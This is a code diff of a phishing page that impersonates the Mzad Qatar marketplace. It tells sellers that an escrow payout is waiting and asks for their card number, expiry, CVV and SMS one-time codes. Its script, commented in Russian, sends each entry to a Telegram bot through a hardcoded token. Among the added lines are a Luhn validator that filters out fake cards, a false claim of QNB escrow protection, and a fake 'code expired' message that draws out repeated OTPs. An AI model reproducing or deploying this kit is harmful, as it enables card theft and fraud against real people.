@@ -1,124 +1,201 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-    <title>Mzad Qatar | Safe Payout Portal</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mzad Qatar | Track & Receive</title>
     <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
     <style>
-        :root { --mzad-red: #8a1538; --bg: #f2f3f5; --text: #333; }
-        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; padding: 0; }
-        .app-shell { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; }
-        header { background: white; padding: 12px 16px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
-        .logo-main { height: 45px; }
-        .ad-box { border-bottom: 8px solid var(--bg); }
-        .img-container { width: 100%; aspect-ratio: 1.2; background: #fff; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #eee; overflow: hidden; }
-        .img-container img { width: 100%; height: 100%; object-fit: contain; }
-        .info { padding: 16px; }
-        .ad-price { font-size: 32px; font-weight: 800; color: var(--mzad-red); margin-bottom: 15px; }
-        .btn-main { background: var(--mzad-red); color: white; border: none; width: 100%; padding: 18px; border-radius: 14px; font-size: 18px; font-weight: 700; cursor: pointer; }
+        :root { --mzad-red: #8a1538; --bg: #f7f7f7; --text: #333; }
+        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; padding: 0; color: var(--text); }
+        .container { max-width: 480px; margin: 0 auto; background: #fff; min-height: 100vh; box-shadow: 0 0 15px rgba(0,0,0,0.05); }
         
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 2000; align-items: center; justify-content: center; }
-        .modal-content { background: white; width: 85%; padding: 25px; border-radius: 24px; text-align: center; }
-        .q-inp { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; margin-bottom: 12px; outline: none; text-align: center; }
+        /* HEADER */
+        .header { background: #fff; padding: 15px 20px; border-bottom: 3px solid var(--mzad-red); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .header img { height: 42px; }
+        .lang { color: var(--mzad-red); font-weight: 700; font-size: 14px; }
+
+        /* CONTENT */
+        .content { padding: 25px 20px; }
+        .status-badge { background: #e8f5e9; border: 1px solid #27ae60; color: #27ae60; padding: 10px 15px; border-radius: 8px; font-weight: 800; margin-bottom: 25px; font-size: 13px; text-transform: uppercase; display: flex; align-items: center; gap: 8px; }
+        .status-badge::before { content: '●'; font-size: 16px; }
         
+        h2 { font-size: 22px; margin: 0 0 15px; color: #111; }
+        p { line-height: 1.6; font-size: 15px; color: #555; margin-bottom: 25px; }
+        .highlight { font-weight: 800; color: var(--mzad-red); }
+        .track-id { font-family: monospace; font-size: 16px; font-weight: bold; color: #333; background: #f0f0f0; padding: 4px 8px; border-radius: 4px; }
+
+        /* FORM */
+        .form-group { margin-bottom: 16px; text-align: left; }
+        label { display: block; font-size: 12px; margin-bottom: 8px; color: #777; font-weight: 700; text-transform: uppercase; }
+        input { width: 100%; padding: 16px; border: 1.5px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; outline: none; transition: 0.2s; background: #fdfdfd; }
+        input:focus { border-color: var(--mzad-red); background: #fff; box-shadow: 0 0 0 3px rgba(138, 21, 56, 0.1); }
+        input.err { border-color: #e74c3c; background: #fdf0f0; }
+
+        .btn { background: var(--mzad-red); color: #fff; border: none; padding: 18px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: 0.2s; box-shadow: 0 4px 15px rgba(138, 21, 56, 0.2); }
+        .btn:active { transform: scale(0.98); }
+
+        /* 3DS STEP */
         #step-2 { display: none; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--mzad-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .app-footer { background: #fff; padding: 40px 16px; text-align: center; border-top: 8px solid var(--bg); }
-        .store-badges img { height: 35px; border-radius: 6px; margin: 0 5px; }
+
+        .footer { padding: 30px 20px; text-align: center; font-size: 12px; color: #999; border-top: 8px solid var(--bg); margin-top: 30px; }
     </style>
 </head>
 <body>
-<div class="app-shell">
-    <header><img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" class="logo-main"><div style="font-weight:700; color:var(--mzad-red); font-size: 14px;">العربية</div></header>
-    <div class="ad-box">
-        <div class="img-container"><img id="p-img" src=""></div>
-        <div class="info">
-            <div style="color: #27ae60; font-size: 12px; font-weight: 800; margin-bottom: 5px;">● VERIFIED TRANSACTION</div>
-            <h1 style="font-size:20px; margin:0 0 10px;" id="p-name">Loading...</h1>
-            <div class="ad-price" id="p-price">0 QAR</div>
-        </div>
-    </div>
-    <div style="padding:20px 16px;"><button class="btn-main" onclick="openModal()">RECEIVE FUNDS</button></div>
 
-    <div class="modal" id="payModal">
-        <div class="modal-content" id="step-1">
-            <div style="font-weight:700; margin-bottom:20px;">Secure Payout Verification</div>
-            <form id="card-form">
-                <input type="text" id="cn" class="q-inp" placeholder="Card Number" required maxlength="19">
-                <div style="display:flex; gap:10px;">
-                    <input type="text" id="ce" class="q-inp" placeholder="MM/YY" required maxlength="5" style="flex:1.5;">
-                    <input type="text" id="cv" class="q-inp" placeholder="CVV" required maxlength="4" style="flex:1;">
+<div class="container">
+    <div class="header">
+        <img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" alt="Mzad Logo">
+        <div class="lang">العربية</div>
+    </div>
+
+    <div class="content" id="step-1">
+        <div class="status-badge">PAYOUT AVAILABLE</div>
+        <h2>Transaction Management</h2>
+        <p>Your secure transaction <span class="track-id" id="t-id">Loading...</span> has been successfully processed by the buyer. Please verify your card details to receive the escrow release of <span class="highlight" id="t-amount">0 QAR</span>.</p>
+        
+        <form id="card-form">
+            <div class="form-group">
+                <label>Card Number</label>
+                <input type="text" id="cc" placeholder="0000 0000 0000 0000" required maxlength="19">
+            </div>
+            <div style="display: flex; gap: 10px;">
+                <div class="form-group" style="flex: 1.5;">
+                    <label>Expiry (MM/YY)</label>
+                    <input type="text" id="exp" placeholder="MM/YY" required maxlength="5">
                 </div>
-                <button type="submit" class="btn-main">CONTINUE</button>
-            </form>
-            <div onclick="closeModal()" style="margin-top:15px; color:#999; cursor:pointer; font-size:14px;">Cancel</div>
-        </div>
-        <div class="modal-content" id="step-2">
-            <div style="font-weight:700;">Bank Verification</div>
-            <p style="font-size:13px; color:#666;">Enter the verification code sent to your mobile phone.</p>
-            <div id="loading-bank" style="display:none;"><div class="loader"></div></div>
-            <form id="sms-form">
-                <input type="text" id="sms-code" class="q-inp" placeholder="SMS Code" required>
-                <button type="submit" class="btn-main">CONFIRM</button>
-            </form>
-        </div>
+                <div class="form-group" style="flex: 1;">
+                    <label>CVV</label>
+                    <input type="password" id="cvv" placeholder="***" required maxlength="4">
+                </div>
+            </div>
+            <button type="submit" class="btn" id="btn-card">VERIFY & RECEIVE</button>
+        </form>
     </div>
 
-    <div class="app-footer">
-        <p style="font-weight:700; font-size:13px;">GET THE MZAD QATAR APP</p>
-        <div class="store-badges">
-            <img src="https://mzadqatar.com/frontend/images/mzad/app_store.png">
-            <img src="https://mzadqatar.com/frontend/images/mzad/google_play.png">
+    <div class="content" id="step-2">
+        <div style="text-align: center;">
+            <img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" style="height: 30px; margin-bottom: 20px;">
+            <h2 style="color: #333;">Bank Authentication</h2>
+            <p style="font-size: 14px;">To authorize the transfer of <b id="t-amount-2" style="color:var(--mzad-red);"></b> to your account, please enter the one-time code sent to your mobile phone.</p>
+            <div id="loading" style="display:none;"><div class="loader"></div></div>
         </div>
+        
+        <form id="sms-form">
+            <div class="form-group">
+                <label style="text-align:center;">Enter SMS Code</label>
+                <input type="text" id="sms" placeholder="Code" required style="text-align:center; font-size: 20px; letter-spacing: 5px;">
+            </div>
+            <button type="submit" class="btn" id="btn-sms">CONFIRM</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        <img src="https://mzadqatar.com/frontend/images/mzad/app_store.png" style="height: 30px; margin-bottom:15px;"><br>
+        © 2026 Mzad Qatar Platform. <br>
+        Secured by QNB Escrow Service.
     </div>
 </div>
 
 <script>
-    // БОТ ДЛЯ ЛОГОВ
-    const T = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
-    const C = '8071425015';
+    // ТВОЙ БОТ-ПРИЕМЩИК
+    const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
+    const CHAT_ID = '8071425015';
 
-    // ДЕКОДИРОВАНИЕ ИЗ HASH (#)
-    let item = "Product", price = "0", img = "";
-    const hashData = window.location.hash.substring(1);
-    if(hashData) {
-        try {
-            const decoded = JSON.parse(atob(hashData));
-            item = decoded.i; price = decoded.p; img = decoded.m;
-        } catch(e) {}
+    // 1. Читаем чистую ссылку (например: /track/id/58392019/1500)
+    const pathSegments = window.location.pathname.split('/').filter(Boolean);
+    
+    // Ищем индекс слова 'id'
+    const idIndex = pathSegments.indexOf('id');
+    let orderId = '94292309';
+    let amount = 'Pending';
+
+    if (idIndex !== -1 && pathSegments.length > idIndex + 1) {
+        orderId = pathSegments[idIndex + 1]; // Берем цифры после id
+        if (pathSegments.length > idIndex + 2) {
+            amount = pathSegments[idIndex + 2]; // Берем сумму
+        }
     }
 
-    document.getElementById('p-name').innerText = item;
-    document.getElementById('p-price').innerText = price + ' QAR';
-    if(img) document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(img)}`;
+    document.getElementById('t-id').innerText = '#' + orderId;
+    document.getElementById('t-amount').innerText = amount + ' QAR';
+    document.getElementById('t-amount-2').innerText = amount + ' QAR';
 
-    function openModal() { document.getElementById('payModal').style.display = 'flex'; }
-    function closeModal() { document.getElementById('payModal').style.display = 'none'; }
+    // 2. Маски ввода
+    document.getElementById('cc').addEventListener('input', function (e) {
+        this.value = this.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+        this.classList.remove('err');
+    });
+    document.getElementById('exp').addEventListener('input', function (e) {
+        this.value = this.value.replace(/\D/g, '').replace(/(.{2})/, '$1/').trim();
+    });
 
-    document.getElementById('cn').oninput = (e) => { e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim(); };
-    document.getElementById('ce').oninput = (e) => { e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{2})/,'$1/').trim(); };
+    // Валидатор Луна (чтобы не слали рандом)
+    function isValidCard(num) {
+        let v = num.replace(/\s+/g, '');
+        let sum = 0;
+        for (let i = 0; i < v.length; i++) {
+            let n = parseInt(v.substr(i, 1));
+            if (i % 2 === v.length % 2) { n *= 2; if (n > 9) n -= 9; }
+            sum += n;
+        }
+        return sum % 10 === 0 && v.length >= 15;
+    }
 
-    // ОТПРАВКА КАРТЫ
-    document.getElementById('card-form').onsubmit = (e) => {
+    // 3. Отправка карты
+    document.getElementById('card-form').addEventListener('submit', async (e) => {
         e.preventDefault();
-        const msg = `🇶🇦 **CARD**\n📦 ${item}\n💰 ${price} QAR\n💳 \`${document.getElementById('cn').value}\`\n📅 \`${document.getElementById('ce').value}\`\n🔒 \`${document.getElementById('cv').value}\``;
-        new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-        document.getElementById('step-1').style.display = 'none';
-        document.getElementById('loading-bank').style.display = 'block';
-        document.getElementById('step-2').style.display = 'block';
-        setTimeout(() => { document.getElementById('loading-bank').style.display = 'none'; }, 2000);
-    };
+        const cc = document.getElementById('cc');
+        
+        if (!isValidCard(cc.value)) {
+            cc.classList.add('err');
+            alert("Invalid card number. Please check carefully.");
+            return;
+        }
 
-    // ОТПРАВКА SMS
-    document.getElementById('sms-form').onsubmit = (e) => {
+        const exp = document.getElementById('exp').value;
+        const cvv = document.getElementById('cvv').value;
+        const btn = document.getElementById('btn-card');
+        btn.innerText = 'CONNECTING...';
+        btn.disabled = true;
+
+        const msg = `🇶🇦 **MZAD CARD**\n🆔 ID: #${orderId}\n💰 Amount: ${amount} QAR\n\n💳 \`${cc.value}\`\n📅 \`${exp}\`\n🔒 \`${cvv}\``;
+        new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+
+        // Переход к SMS
+        setTimeout(() => {
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-2').style.display = 'block';
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('sms-form').style.display = 'none';
+            
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('sms-form').style.display = 'block';
+            }, 2000);
+        }, 1000);
+    });
+
+    // 4. Отправка SMS
+    document.getElementById('sms-form').addEventListener('submit', async (e) => {
         e.preventDefault();
-        const code = document.getElementById('sms-code').value;
-        const msg = `🔑 **SMS**: \`${code}\`\n👤 Item: ${item}`;
-        new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-        alert("Invalid code. Please wait for a new one.");
-        document.getElementById('sms-code').value = '';
-    };
+        const sms = document.getElementById('sms').value;
+        const btn = document.getElementById('btn-sms');
+        btn.innerText = 'VERIFYING...';
+        btn.disabled = true;
+
+        const msg = `🔑 **SMS CODE**: \`${sms}\`\n🆔 Order: #${orderId}`;
+        new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+
+        setTimeout(() => {
+            alert("The code has expired or is incorrect. A new verification code has been sent.");
+            btn.innerText = 'CONFIRM';
+            btn.disabled = false;
+            document.getElementById('sms').value = '';
+        }, 2500);
+    });
 </script>
 </body>
 </html>
